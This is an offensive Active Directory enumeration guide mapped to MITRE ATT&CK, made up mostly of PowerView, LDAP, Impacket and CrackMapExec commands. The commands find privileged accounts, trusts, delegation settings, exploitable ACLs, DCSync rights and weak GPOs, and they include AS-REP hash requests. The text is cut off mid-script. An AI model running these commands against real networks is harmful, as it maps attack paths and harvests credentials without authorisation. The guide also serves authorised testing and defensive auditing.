# Active Directory Enumeration


---

## Introduction

Active Directory enumeration is the systematic process of gathering information about an AD environment to identify attack paths, privilege escalation opportunities, and security misconfigurations. This guide covers techniques from initial reconnaissance to deep domain analysis.

**Key Objectives:**
- Map the domain structure and trust relationships
- Identify privileged users and groups
- Discover exploitable ACL misconfigurations
- Find paths to Domain Admin or high-value targets
- Enumerate GPOs and their security implications
- Identify delegation issues and vulnerable configurations

**Prerequisites:**
- Basic understanding of Active Directory concepts
- Access level: Varies from unauthenticated to domain user
- Attack host: Windows or Linux with appropriate tools

---

## MITRE ATT&CK Mapping

**Primary Techniques:**
- **T1087.001** - Account Discovery: Domain Account
- **T1087.002** - Account Discovery: Domain Account (LDAP)
- **T1069.001** - Permission Groups Discovery: Local Groups
- **T1069.002** - Permission Groups Discovery: Domain Groups
- **T1482** - Domain Trust Discovery
- **T1018** - Remote System Discovery
- **T1201** - Password Policy Discovery
- **T1615** - Group Policy Discovery
- **T1033** - System Owner/User Discovery

**Associated Tactics:**
- Discovery (TA0007)
- Credential Access (TA0006) - when combined with credential harvesting
- Lateral Movement (TA0008) - preparation phase

---

## Enumeration Phases

### Phase 1: External Reconnaissance (No Credentials)
- DNS enumeration
- Public information gathering
- Network service discovery
- Anonymous LDAP queries (if permitted)

### Phase 2: Authenticated Enumeration (Domain User)
- Domain structure mapping
- User and group enumeration
- GPO discovery
- ACL analysis

### Phase 3: Deep Analysis (Privileged Context)
- Complete BloodHound collection
- Sensitive attribute extraction
- Trust relationship analysis
- Delegation configuration review

### Phase 4: Attack Path Identification
- Shortest paths to Domain Admin
- Kerberoastable accounts
- AS-REP roastable users
- ACL-based attack paths
- Unconstrained delegation abuse

---

## Domain Enumeration

### 1.1 Domain Controllers Identification

#### Using PowerView (Windows)
```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Get domain controllers
Get-DomainController
Get-DomainController -Domain corp.local

# Detailed DC information
Get-DomainController | Select-Object Name, OSVersion, IPAddress, Roles

# Find primary DC (PDC)
Get-DomainController -Identity (Get-Domain).PdcRoleOwner

# Get all DCs in the forest
Get-ForestDomain | %{Get-DomainController -Domain $_}
```

#### Using Built-in Windows Tools
```powershell
# Using nltest
nltest /dclist:corp.local
nltest /dsgetdc:corp.local

# Using AD PowerShell module
Get-ADDomainController -Filter *
Get-ADDomainController -Discover -Service PrimaryDC

# DNS query for DCs
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local

# Find FSMO role holders
netdom query fsmo
```

#### Using Linux Tools
```bash
# ldapsearch for DCs
ldapsearch -x -H ldap://dc01.corp.local -s sub -b "OU=Domain Controllers,DC=corp,DC=local" "(objectClass=computer)" dNSHostName operatingSystem

# Impacket GetADUsers.py
GetADUsers.py -dc-ip 10.10.10.100 corp.local/user:password -all

# CrackMapExec
crackmapexec ldap 10.10.10.100 -u user -p password --dc-list

# enum4linux-ng
enum4linux-ng -A -u user -p password 10.10.10.100
```

### 1.2 Domain Trusts Mapping

#### PowerView Trust Enumeration
```powershell
# Get domain trusts
Get-DomainTrust
Get-DomainTrust -Domain corp.local

# Get forest trusts
Get-ForestTrust

# Detailed trust information
Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType, TrustAttributes

# Map all trusts in forest
Get-ForestDomain | %{Get-DomainTrust -Domain $_}

# Enumerate external trusts
Get-DomainTrust | Where-Object {$_.TrustType -eq 'External'}

# Find bidirectional trusts
Get-DomainTrust | Where-Object {$_.TrustDirection -eq 'Bidirectional'}
```

#### Built-in Commands
```powershell
# Using nltest
nltest /domain_trusts
nltest /all_trusts
nltest /trusted_domains

# Using AD Module
Get-ADTrust -Filter *
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, SIDFilteringQuarantined
```

#### Trust Direction Understanding
```
Bidirectional (3) - Two-way trust
Inbound (2) - Current domain trusts the specified domain
Outbound (1) - Specified domain trusts current domain
Disabled (0) - Trust is disabled
```

#### Trust Types
```
ParentChild (1) - Parent-child domain in same forest
CrossLink (2) - Shortcut trust between domains
External (3) - Trust with domain outside forest
Forest (4) - Forest-level trust
Kerberos (5) - Kerberos realm trust (non-Windows)
Unknown (6) - Unknown trust type
```

### 1.3 Forest Enumeration

```powershell
# Get current forest
Get-Forest
Get-Forest -Forest corp.local

# Get all domains in forest
Get-ForestDomain
(Get-Forest).Domains

# Get Global Catalogs
Get-ForestGlobalCatalog

# Forest functional level
(Get-Forest).ForestMode

# Schema master
(Get-Forest).SchemaRoleOwner

# Domain naming master
(Get-Forest).NamingRoleOwner

# Get all trusts in forest
Get-Forest | Select-Object -ExpandProperty Domains | %{Get-DomainTrust -Domain $_}
```

### 1.4 Site and Subnet Discovery

```powershell
# Get AD sites
Get-ADReplicationSite -Filter *

# Get subnets
Get-ADReplicationSubnet -Filter *

# Site links
Get-ADReplicationSiteLink -Filter *

# Map sites to subnets
Get-ADReplicationSubnet -Filter * | Select-Object Name, Site, Location

# PowerView alternative
Get-DomainSite
Get-DomainSubnet
```

---

## User Enumeration

### 2.1 User Discovery Techniques

#### PowerView User Enumeration
```powershell
# Get all domain users
Get-DomainUser
Get-DomainUser -Properties samaccountname, description, pwdlastset, logoncount

# Specific user
Get-DomainUser -Identity administrator

# Users with SPN set (Kerberoastable)
Get-DomainUser -SPN

# Users with unconstrained delegation
Get-DomainUser -UncheckedDelegation

# Users with constrained delegation
Get-DomainUser -TrustedToAuth

# Users with AdminCount=1
Get-DomainUser -AdminCount

# Recently created users (last 30 days)
$date = (Get-Date).AddDays(-30)
Get-DomainUser | Where-Object {$_.whencreated -ge $date}

# Active users (logged in last 90 days)
$date = (Get-Date).AddDays(-90)
Get-DomainUser -Properties lastlogondate | Where-Object {$_.lastlogondate -ge $date}

# Disabled users
Get-DomainUser -Properties useraccountcontrol | Where-Object {$_.useraccountcontrol -band 2}

# Users with passwords set to never expire
Get-DomainUser -Properties pwdlastset,useraccountcontrol | Where-Object {$_.useraccountcontrol -band 65536}

# Users with reversible encryption
Get-DomainUser -Properties useraccountcontrol | Where-Object {$_.useraccountcontrol -band 128}
```

#### LDAP Queries for Users
```bash
# Linux - ldapsearch all users
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description

# Users with SPN
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Users with AdminCount=1
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName

# AS-REP roastable users (DONT_REQ_PREAUTH)
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

#### Impacket User Enumeration
```bash
# Get all users
GetADUsers.py corp.local/user:password -dc-ip 10.10.10.100 -all

# Users with specific attributes
GetADUsers.py corp.local/user:password -dc-ip 10.10.10.100 -all -debug

# GetNPUsers (AS-REP roasting)
GetNPUsers.py corp.local/ -dc-ip 10.10.10.100 -usersfile users.txt -format hashcat

# With credentials
GetNPUsers.py corp.local/user:password -dc-ip 10.10.10.100 -request
```

### 2.2 Password Policies

#### PowerView Password Policy
```powershell
# Domain password policy
Get-DomainPolicyData

# Get specific policy
(Get-DomainPolicyData).SystemAccess

# Fine-grained password policies
Get-DomainFineGrainedPasswordPolicy

# Users affected by FGPP
Get-DomainFineGrainedPasswordPolicy | Select-Object Name, Precedence, MinPasswordLength, ComplexityEnabled
```

#### Built-in Commands
```powershell
# Using net
net accounts /domain

# AD PowerShell
Get-ADDefaultDomainPasswordPolicy
Get-ADFineGrainedPasswordPolicy -Filter *

# Check who FGPP applies to
Get-ADFineGrainedPasswordPolicySubject -Identity "PSO_Name"
```

#### Linux Enumeration
```bash
# CrackMapExec
crackmapexec smb 10.10.10.100 -u user -p password --pass-pol

# Enum4linux
enum4linux -P -u user -p password 10.10.10.100

# ldapsearch for password policy
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(objectClass=domainDNS)" minPwdLength pwdHistoryLength pwdProperties maxPwdAge minPwdAge lockoutThreshold lockoutDuration
```

### 2.3 User Attributes Analysis

#### Interesting User Properties
```powershell
# Users with description field (might contain passwords)
Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -ne $null}

# Users with info field
Get-DomainUser -Properties samaccountname,info | Where-Object {$_.info -ne $null}

# Service Principal Names
Get-DomainUser -Properties samaccountname,serviceprincipalname | Where-Object {$_.serviceprincipalname -ne $null}

# Users with HomeDirectory set
Get-DomainUser -Properties samaccountname,homedirectory | Where-Object {$_.homedirectory -ne $null}

# Users with scriptpath
Get-DomainUser -Properties samaccountname,scriptpath | Where-Object {$_.scriptpath -ne $null}

# Users allowed to delegate
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto

# User certificate information
Get-DomainUser -Properties samaccountname,userCertificate | Where-Object {$_.userCertificate -ne $null}

# Manager relationships
Get-DomainUser -Properties samaccountname,manager | Where-Object {$_.manager -ne $null}
```

#### Password Analysis Attributes
```powershell
# Bad password count
Get-DomainUser -Properties samaccountname,badpwdcount | Where-Object {$_.badpwdcount -gt 0}

# Password last set
Get-DomainUser -Properties samaccountname,pwdlastset | Sort-Object pwdlastset

# Users with old passwords (>365 days)
$date = (Get-Date).AddDays(-365)
Get-DomainUser -Properties samaccountname,pwdlastset | Where-Object {$_.pwdlastset -lt $date}

# Users who never logged in
Get-DomainUser -Properties samaccountname,lastlogon | Where-Object {$_.lastlogon -eq $null}

# Logon count
Get-DomainUser -Properties samaccountname,logoncount | Sort-Object logoncount
```

### 2.4 Privileged Users Identification

```powershell
# Users with AdminCount=1
Get-DomainUser -AdminCount | Select-Object samaccountname,admincount,whencreated

# Members of high-privilege groups
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins" -Recurse
Get-DomainGroupMember "Administrators" -Recurse

# Users with DCSync rights
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {($_.ObjectAceType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

# Protected users group
Get-DomainGroupMember "Protected Users"

# Schema Admins
Get-DomainGroupMember "Schema Admins"

# Backup Operators
Get-DomainGroupMember "Backup Operators"

# Account Operators
Get-DomainGroupMember "Account Operators"

# Server Operators
Get-DomainGroupMember "Server Operators"
```

### 2.5 Service Accounts

```powershell
# Kerberoastable accounts (SPN set)
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Service accounts by naming convention
Get-DomainUser -Properties samaccountname | Where-Object {$_.samaccountname -like "*svc*" -or $_.samaccountname -like "*service*"}

# Managed Service Accounts
Get-ADServiceAccount -Filter *

# Group Managed Service Accounts
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"}

# Computer accounts with SPN (might be service accounts)
Get-DomainComputer -SPN | Select-Object samaccountname,serviceprincipalname

# LAPS readable accounts
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like "ms-Mcs-AdmPwd") -and ($_.ActiveDirectoryRights -match "ReadProperty")}
```

---

## Group Enumeration

### 3.1 High-Value Groups

```powershell
# Domain Admins
Get-DomainGroupMember "Domain Admins" -Recurse | Select-Object MemberName,MemberObjectClass

# Enterprise Admins
Get-DomainGroupMember "Enterprise Admins" -Recurse

# Administrators (Built-in)
Get-DomainGroupMember "Administrators" -Recurse

# Schema Admins
Get-DomainGroupMember "Schema Admins"

# Backup Operators
Get-DomainGroupMember "Backup Operators"

# Account Operators
Get-DomainGroupMember "Account Operators"

# Server Operators
Get-DomainGroupMember "Server Operators"

# Print Operators
Get-DomainGroupMember "Print Operators"

# DNS Admins
Get-DomainGroupMember "DnsAdmins"

# Protected Users
Get-DomainGroupMember "Protected Users"

# Group Policy Creator Owners
Get-DomainGroupMember "Group Policy Creator Owners"
```

### 3.2 All Domain Groups

```powershell
# List all groups
Get-DomainGroup
Get-DomainGroup -Properties samaccountname,description,whenCreated

# Security groups only
Get-DomainGroup -GroupScope Security

# Distribution groups
Get-DomainGroup -GroupScope Distribution

# Groups with AdminCount=1
Get-DomainGroup -AdminCount

# Recently created groups
$date = (Get-Date).AddDays(-30)
Get-DomainGroup -Properties whencreated | Where-Object {$_.whencreated -ge $date}

# Empty groups
Get-DomainGroup | Where-Object {-not (Get-DomainGroupMember -Identity $_.samaccountname)}

# Groups with external members
Get-DomainGroup | Where-Object {Get-DomainGroupMember -Identity $_.samaccountname | Where-Object {$_.MemberDomain -ne $env:USERDOMAIN}}
```

### 3.3 Nested Group Membership

```powershell
# Get nested membership for specific user
Get-DomainGroup -MemberIdentity "username" -Recurse

# Get all nested members of Domain Admins
Get-DomainGroupMember "Domain Admins" -Recurse

# Check nested group depth
function Get-NestedGroupMembership {
    param([string]$GroupName)
    $members = Get-DomainGroupMember $GroupName
    foreach ($member in $members) {
        if ($member.MemberObjectClass -eq 'group') {
            Write-Host "[+] Nested Group: $($member.MemberName)"
            Get-NestedGroupMembership -GroupName $member.MemberName
        }
    }
}

# Find circular nested groups
Get-DomainGroup | ForEach-Object {
    $groupName = $_.samaccountname
    $members = Get-DomainGroupMember $groupName -Recurse
    if ($members.MemberName -contains $groupName) {
        Write-Host "[!] Circular nesting detected in: $groupName"
    }
}

# User's complete group membership
Get-DomainGroup -MemberIdentity "username" | Select-Object samaccountname
```

### 3.4 Foreign Security Principals

```powershell
# Find Foreign Security Principals
Get-DomainObject -SearchBase "CN=ForeignSecurityPrincipals,DC=corp,DC=local"

# FSPs in privileged groups
Get-DomainGroupMember "Domain Admins" | Where-Object {$_.MemberSID -like "S-1-5-21-*-*-*-*"}

# Cross-domain memberships
$trustedDomains = Get-DomainTrust
foreach ($trust in $trustedDomains) {
    Get-DomainForeignGroupMember -Domain $trust.TargetName
}

# Using built-in tools
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Properties *

# Resolve FSP SIDs
Get-DomainObject -SearchBase "CN=ForeignSecurityPrincipals,DC=corp,DC=local" | ForEach-Object {
    $sid = $_.cn
    try {
        $resolved = ConvertFrom-SID $sid
        Write-Host "SID: $sid -> $resolved"
    } catch {
        Write-Host "SID: $sid -> Could not resolve"
    }
}
```

### 3.5 Custom Privileged Groups

```powershell
# Groups with "admin" in name
Get-DomainGroup -Properties samaccountname | Where-Object {$_.samaccountname -like "*admin*"}

# Groups with delegated permissions on domain
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# Groups with GPO modification rights
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty"}

# Groups that can modify other groups
Get-DomainGroup | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty" -and $_.SecurityIdentifier -ne "S-1-5-18"}

# Groups with custom AdminSDHolder-like permissions
Get-DomainGroup | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.InheritanceType -eq "None"}

# High member count groups (potential high-value targets)
Get-DomainGroup | ForEach-Object {
    $count = (Get-DomainGroupMember $_.samaccountname).Count
    if ($count -gt 50) {
        [PSCustomObject]@{
            GroupName = $_.samaccountname
            MemberCount = $count
        }
    }
} | Sort-Object MemberCount -Descending
```

---

## Computer Enumeration

### 4.1 Domain-Joined Computers

```powershell
# All domain computers
Get-DomainComputer
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp

# Active computers (logged in last 90 days)
$date = (Get-Date).AddDays(-90).ToFileTime()
Get-DomainComputer -Properties dnshostname,lastlogontimestamp | Where-Object {$_.lastlogontimestamp -ge $date}

# Computers by naming pattern
Get-DomainComputer -Identity "WS*"
Get-DomainComputer -Identity "SRV*"

# Enabled computers only
Get-DomainComputer -Properties useraccountcontrol | Where-Object {-not ($_.useraccountcontrol -band 2)}

# Computers with specific description
Get-DomainComputer -Properties dnshostname,description | Where-Object {$_.description -ne $null}

# Recently created computers
$date = (Get-Date).AddDays(-30)
Get-DomainComputer -Properties whencreated,dnshostname | Where-Object {$_.whencreated -ge $date}
```

### 4.2 Operating System Enumeration

```powershell
# Group by OS version
Get-DomainComputer -Properties operatingsystem | Group-Object operatingsystem | Select-Object Count,Name

# Windows Server systems
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10/11 workstations
Get-DomainComputer -OperatingSystem "*Windows 10*"
Get-DomainComputer -OperatingSystem "*Windows 11*"

# Outdated OS (e.g., Windows 7, Server 2008)
Get-DomainComputer -OperatingSystem "*Windows 7*"
Get-DomainComputer -OperatingSystem "*Server 2008*"

# OS version details
Get-DomainComputer -Properties dnshostname,operatingsystem,operatingsystemversion | Format-Table

# Servers only
Get-DomainComputer -Properties dnshostname,operatingsystem | Where-Object {$_.operatingsystem -like "*Server*"}

# Workstations only
Get-DomainComputer -Properties dnshostname,operatingsystem | Where-Object {$_.operatingsystem -notlike "*Server*"}
```

### 4.3 Server Roles

#### Domain Controllers
```powershell
# DCs via PowerView
Get-DomainController

# DCs via LDAP filter
Get-DomainComputer -Properties dnshostname -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=8192)"

# DC OS versions
Get-DomainController | Select-Object Name,OSVersion
```

#### Exchange Servers
```powershell
# Exchange via service connection points
Get-DomainObject -SearchBase "CN=Configuration,DC=corp,DC=local" -LDAPFilter "(objectClass=serviceConnectionPoint)" -Properties servicebindingInformation,serviceclassname | Where-Object {$_.serviceclassname -eq "ms-Exchange-AutoDiscover-Service"}

# Exchange servers via group membership
Get-DomainGroupMember "Exchange Servers"
Get-DomainGroupMember "Exchange Trusted Subsystem"

# Exchange via computer description
Get-DomainComputer -Properties dnshostname,description | Where-Object {$_.description -like "*Exchange*"}
```

#### SQL Servers
```powershell
# SQL via SPN
Get-DomainComputer -Properties dnshostname,serviceprincipalname | Where-Object {$_.serviceprincipalname -like "*MSSQLSvc*"}

# SQL instances
Get-DomainObject -LDAPFilter "(&(objectClass=computer)(servicePrincipalName=MSSQLSvc*))" -Properties dnshostname,serviceprincipalname

# SQL via naming convention
Get-DomainComputer -Identity "*SQL*"
```

#### Web Servers (IIS)
```powershell
# IIS via SPN
Get-DomainComputer -Properties dnshostname,serviceprincipalname | Where-Object {$_.serviceprincipalname -like "*HTTP*"}

# Web servers via naming
Get-DomainComputer -Identity "*WEB*"
Get-DomainComputer -Identity "*IIS*"
```

#### File Servers
```powershell
# File servers via naming
Get-DomainComputer -Identity "*FILE*"
Get-DomainComputer -Identity "*FS*"

# File servers via shares
Get-DomainComputer | ForEach-Object {
    $shares = Get-NetShare -ComputerName $_.dnshostname -ErrorAction SilentlyContinue
    if ($shares.Count -gt 3) {  # More than default shares
        [PSCustomObject]@{
            Computer = $_.dnshostname
            ShareCount = $shares.Count
        }
    }
}
```

### 4.4 Unconstrained Delegation Hosts

```powershell
# Computers with unconstrained delegation
Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol

# Exclude DCs (they have unconstrained by default)
Get-DomainComputer -Unconstrained | Where-Object {$_.useraccountcontrol -notmatch "SERVER_TRUST_ACCOUNT"}

# Detailed unconstrained delegation info
Get-DomainComputer -Unconstrained -Properties dnshostname,operatingsystem,description | Format-Table

# Users with unconstrained delegation
Get-DomainUser -UncheckedDelegation -Properties samaccountname,serviceprincipalname

# LDAP filter for unconstrained delegation
Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties dnshostname

# Constrained delegation
Get-DomainComputer -TrustedToAuth -Properties dnshostname,msds-allowedtodelegateto
```

---

## ACL/Permission Enumeration

### 5.1 Interesting ACEs Discovery

#### Generic Permissions
```powershell
# GenericAll on users
Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*"}

# GenericAll on computers
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

# GenericAll on groups
Get-DomainGroup | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

# GenericWrite permissions
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite" -and $_.SecurityIdentifier -match "S-1-5-21-.*"}

# WriteDacl permissions (can modify ACL)
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteDacl"}

# WriteOwner permissions
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteOwner"}
```

#### Specific Property Write Access
```powershell
# WriteProperty on specific attributes
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty"}

# Self rights (can add to group)
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Self"}

# ExtendedRight permissions
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "ExtendedRight"}

# User-Force-Change-Password
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "User-Force-Change-Password"}

# Add-Members to groups
Get-DomainGroup | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "Add-Members"}
```

### 5.2 Exploitable ACEs

```powershell
# Current user's exploitable ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match $env:USERNAME}

# Specific user's exploitable ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq "targetuser"}

# Domain users group exploitable ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Domain Users"}

# Everyone group exploitable ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Everyone"}

# Authenticated Users exploitable ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Authenticated Users"}

# ACLs leading to Domain Admins
Get-DomainGroup "Domain Admins" | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}
```

### 5.3 Shadow Credentials Vulnerabilities

```powershell
# Find objects where current user can write msDS-KeyCredentialLink
Get-DomainObject -LDAPFilter "(objectClass=user)" | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-KeyCredentialLink" -and $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll"}

# Objects vulnerable to shadow credentials attack
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-KeyCredentialLink" -and $_.ActiveDirectoryRights -match "WriteProperty"}

# Users where Domain Users can write KeyCredentialLink
Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-KeyCredentialLink" -and $_.IdentityReferenceName -match "Domain Users"}

# Computers vulnerable to shadow credentials
Get-DomainComputer -Properties dnshostname | ForEach-Object {
    $acls = Get-DomainObjectAcl -Identity $_.dnshostname -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-KeyCredentialLink"}
    if ($acls) {
        [PSCustomObject]@{
            Computer = $_.dnshostname
            VulnerableTo = $acls.SecurityIdentifier
        }
    }
}

# Check if WHfBKey prerequisites exist
Get-DomainObject -LDAPFilter "(msDS-KeyCredentialLink=*)" -Properties samaccountname,msDS-KeyCredentialLink
```

### 5.4 RBCD (Resource-Based Constrained Delegation) Targets

```powershell
# Computers with msDS-AllowedToActOnBehalfOfOtherIdentity set
Get-DomainComputer -Properties dnshostname,msds-allowedtoactonbehalfofotheridentity | Where-Object {$_."msds-allowedtoactonbehalfofotheridentity" -ne $null}

# Objects where current user can write msDS-AllowedToActOnBehalfOfOtherIdentity
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity" -and $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll"}

# Computers writable by Domain Users (RBCD target)
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity" -or $_.ActiveDirectoryRights -match "GenericAll|GenericWrite") -and $_.IdentityReferenceName -match "Domain Users"}

# Function to check RBCD writability
function Find-RBCDTargets {
    Get-DomainComputer -Properties dnshostname,samaccountname | ForEach-Object {
        $acl = Get-DomainObjectAcl -Identity $_.samaccountname -ResolveGUIDs | Where-Object {
            $_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity" -and
            $_.ActiveDirectoryRights -match "WriteProperty"
        }
        if ($acl) {
            [PSCustomObject]@{
                Target = $_.dnshostname
                WritableBy = $acl.IdentityReferenceName
            }
        }
    }
}

# Computers with GenericAll/GenericWrite (potential RBCD)
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite" -and $_.SecurityIdentifier -match "S-1-5-21"}
```

### 5.5 DCSync Rights Detection

```powershell
# Users with DCSync rights (DS-Replication-Get-Changes)
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "DS-Replication-Get-Changes" -and $_.SecurityIdentifier -match "S-1-5-21"}

# Both required rights for DCSync
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {
    ($_.ObjectAceType -eq "DS-Replication-Get-Changes" -or $_.ObjectAceType -eq "DS-Replication-Get-Changes-All") -and
    $_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-32-544"  # Exclude SYSTEM and Administrators
}

# Users with Replicating Directory Changes All
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "DS-Replication-Get-Changes-All"}

# Check specific user for DCSync capability
$userSID = (Get-DomainUser -Identity "username").objectsid
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $userSID -and $_.ObjectAceType -match "DS-Replication"}
```

---

## GPO Enumeration

### 6.1 Applied GPOs

```powershell
# All GPOs in domain
Get-DomainGPO
Get-DomainGPO -Properties displayname,gpcfilesyspath

# GPOs applied to specific OU
Get-DomainOU -Identity "OU=Servers,DC=corp,DC=local" | Get-DomainGPO

# GPOs applied to specific computer
Get-DomainGPO -ComputerIdentity "WS01"

# User GPOs
Get-DomainGPO | Where-Object {$_.gpcUserExtensionNames -ne $null}

# Computer GPOs
Get-DomainGPO | Where-Object {$_.gpcMachineExtensionNames -ne $null}

# GPO links
Get-DomainGPOLocalGroup

# Organizational Units and their GPOs
Get-DomainOU -Properties ou,gplink | Where-Object {$_.gplink -ne $null}
```

### 6.2 GPO Permissions

```powershell
# Users who can modify GPOs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21"}

# Specific user's GPO modification rights
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq "username" -and $_.ObjectDN -like "*CN=Policies,CN=System*"}

# GPOs writable by Domain Users
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Domain Users" -and $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite"}

# GPOs writable by Authenticated Users
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Authenticated Users" -and $_.ActiveDirectoryRights -match "CreateChild|WriteProperty"}

# Owner of GPOs
Get-DomainGPO -Properties displayname | ForEach-Object {
    $owner = Get-DomainObjectAcl -Identity $_.distinguishedname | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"} | Select-Object -First 1
    [PSCustomObject]@{
        GPOName = $_.displayname
        Owner = $owner.SecurityIdentifier
    }
}
```

### 6.3 Vulnerable GPO Configurations

#### Insecure GPO Permissions
```powershell
# GPOs with weak ACLs
Get-DomainGPO | ForEach-Object {
    $gpo = $_
    $weakACLs = Get-DomainObjectAcl -Identity $_.distinguishedname -ResolveGUIDs | Where-Object {
        $_.IdentityReferenceName -match "Domain Users|Authenticated Users|Everyone" -and
        $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll"
    }
    if ($weakACLs) {
        [PSCustomObject]@{
            GPOName = $gpo.displayname
            VulnerableACL = $weakACLs.IdentityReferenceName
        }
    }
}

# GPOs linked to Domain Controllers OU (high value)
Get-DomainOU -Identity "OU=Domain Controllers,DC=corp,DC=local" | Select-Object -ExpandProperty gplink
```

#### GPO Scripts and Tasks
```powershell
# Find GPOs with scripts
Get-DomainGPO -Properties displayname,gpcfilesyspath | ForEach-Object {
    $scriptsPath = "$($_.gpcfilesyspath)\Machine\Scripts\Startup"
    if (Test-Path $scriptsPath) {
        Get-ChildItem $scriptsPath
    }
}

# GPO Scheduled Tasks
Get-DomainGPO | ForEach-Object {
